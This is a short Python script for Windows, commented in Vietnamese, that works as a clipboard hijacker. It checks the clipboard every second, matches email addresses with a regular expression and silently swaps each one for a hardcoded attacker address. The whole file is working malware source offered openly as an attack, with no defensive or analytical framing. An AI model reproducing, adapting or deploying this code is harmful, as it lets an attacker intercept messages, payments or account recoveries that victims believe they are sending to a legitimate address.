import win32clipboard  
import re              
from time import sleep 

# Địa chỉ email mà attacker muốn thay thế vào clipboard
attacker_email = "attacker@email.com"

# Biểu thức chính quy để nhận diện địa chỉ email
emailregex = r'[a-z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'

def get_clipboard_text():
    try:
        win32clipboard.OpenClipboard()  # Mở clipboard để đọc dữ liệu
        if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_UNICODETEXT):
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)  # Lấy dữ liệu text Unicode
        else:
            data = ""
        win32clipboard.CloseClipboard()
        return data
    except:
        win32clipboard.CloseClipboard()  # Đảm bảo clipboard được đóng kể cả khi lỗi xảy ra
        return ""

def set_clipboard_text(text):
    """
    Ghi dữ liệu text Unicode vào clipboard.
    """
    try:
        win32clipboard.OpenClipboard()         # Mở clipboard để ghi dữ liệu
        win32clipboard.EmptyClipboard()        # Xóa dữ liệu hiện tại
        win32clipboard.SetClipboardText(text, win32clipboard.CF_UNICODETEXT)  # Ghi text mới
        win32clipboard.CloseClipboard()
    except:
        win32clipboard.CloseClipboard()        # Đảm bảo clipboard được đóng kể cả khi lỗi xảy ra

# Vòng lặp chính: theo dõi clipboard liên tục
while True:
    text = get_clipboard_text()  # Lấy nội dung clipboard

    # Nếu clipboard rỗng hoặc chỉ chứa khoảng trắng, tiếp tục vòng lặp sau 1 giây
    if not text.strip():
        sleep(1)
        continue

    # Nếu phát hiện nội dung clipboard có chứa email
    if re.search(emailregex, text):
        replaced = re.sub(emailregex, attacker_email, text)  # Thay thế tất cả email bằng email của attacker
        if replaced != text:
            set_clipboard_text(replaced)  # Cập nhật clipboard nếu có sự thay đổi

    sleep(1)  # Tạm dừng 1 giây trước khi kiểm tra lại
